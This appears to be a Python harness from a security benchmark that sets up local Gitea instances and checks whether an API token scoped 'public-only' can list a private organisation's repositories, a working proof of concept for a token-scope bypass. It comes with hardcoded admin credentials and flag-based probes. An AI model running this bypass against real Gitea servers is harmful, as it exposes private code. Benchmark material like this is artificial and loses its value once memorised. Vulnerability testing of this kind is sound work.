# Seed witness (neutralized for Benchmark V2)
# Drives the known-good exploit path on the vulnerable version and its blocking on
# the patched version. Neutral content only; behavior identical to construction time.



import hashlib
import os
import re
import time
import requests


def flag_token(flag: str) -> str:
    """flag 的短确定性 token（gitea 名限制 40 字符内）。"""
    return hashlib.sha256(flag.lower().encode()).hexdigest()[:12]

BASE = {"v0": "http://127.0.0.1:56840", "v1": "http://127.0.0.1:56841"}
ADMIN = "pcbadmin"
PASS = "Admin12345!"


def _base(version: str) -> str:
    port = os.environ.get("PCB_TARGET_PORT")
    if port:
        return f"http://127.0.0.1:{int(port)}"
    pbt = os.environ.get("PCB_TARGET_BASE")
    if pbt:
        return pbt.rstrip("/")
    return BASE[version]


def wait_ready(version: str, timeout: int = 240) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = requests.get(f"{_base(version)}/", timeout=5)
            if r.status_code < 500:
                return True
        except Exception:
            pass
        time.sleep(4)
    return False


def wait_version(version: str, timeout: int = 300) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = requests.get(f"{_base(version)}/api/v1/version", timeout=5)
            if r.status_code == 200:
                return True
        except Exception:
            pass
        time.sleep(5)
    return False


def install(version: str) -> bool:
    base = _base(version)
    port = base.split(":")[-1]
    s = requests.Session()
    # 轮询等待安装页出现（gitea 启动完成）；超时后若仍无安装页视为已安装
    html = ""
    deadline = time.time() + 180
    while time.time() < deadline:
        try:
            html = s.get(f"{base}/", timeout=10).text
        except Exception:
            time.sleep(4)
            continue
        if "admin_name" in html:
            break
        try:
            if requests.get(f"{base}/api/v1/version", timeout=5).status_code == 200:
                return True  # 已安装（API 就绪）
        except Exception:
            pass
        time.sleep(4)
    if "admin_name" not in html:
        return True
    m = re.search(r'name="_csrf" content="([^"]+)"', html)
    csrf = m.group(1) if m else s.cookies.get("_csrf", "")
    data = {
        "_csrf": csrf, "db_type": "sqlite3", "db_path": "/data/gitea/gitea.db",
        "app_name": "Gitea", "repo_root_path": "/data/git/repositories", "run_user": "git",
        "domain": "localhost", "ssh_port": "22", "http_port": "3000",
        "app_url": f"http://localhost:{port}/", "log_root_path": "/data/gitea/log",
        "admin_name": ADMIN, "admin_passwd": PASS, "admin_confirm_passwd": PASS,
        "admin_email": "admin@pcb.local",
    }
    s.post(f"{base}/", data=data, timeout=30)
    return wait_ready(version, timeout=120)


def setup(version: str, flag: str):
    
    install(version)
    wait_version(version)
    base = _base(version)
    auth = (ADMIN, PASS)
    tok = flag_token(flag)
    org = "pcb_" + tok
    try:
        requests.post(f"{base}/api/v1/orgs", auth=auth,
                      json={"username": org, "visibility": "private"}, timeout=15)
    except Exception:
        pass
    try:
        requests.post(f"{base}/api/v1/orgs/{org}/repos", auth=auth,
                      json={"name": "secret_" + tok, "private": True,
                            "auto_init": True, "default_branch": "main"}, timeout=30)
    except Exception:
        pass
    tok = None
    for i in range(6):
        r = requests.post(f"{base}/api/v1/users/{ADMIN}/tokens", auth=auth,
                          json={"name": f"pubtok{int(time.time())}{i}", "scopes": [
                              "read:user", "read:organization", "read:repository", "public-only"]},
                          timeout=15)
        if r.status_code in (201, 200) and "sha1" in r.text:
            tok = r.json()["sha1"]
            break
    return org, tok


def seed_probe(version: str, flag: str) -> dict:
    
    org, tok = setup(version, flag)
    r = requests.get(f"{_base(version)}/api/v1/orgs/{org}/repos",
                     headers={"Authorization": f"token {tok}"}, timeout=15)
    return {"ok": flag_token(flag) in r.text, "status": r.status_code, "body": r.text[:3000]}


def residual_probe(version: str, flag: str) -> dict:
    
    org, tok = setup(version, flag)
    r = requests.get(f"{_base(version)}/api/v1/user/orgs",
                     headers={"Authorization": f"token {tok}"}, timeout=15)
    return {"ok": flag_token(flag) in r.text, "status": r.status_code, "body": r.text[:3000]}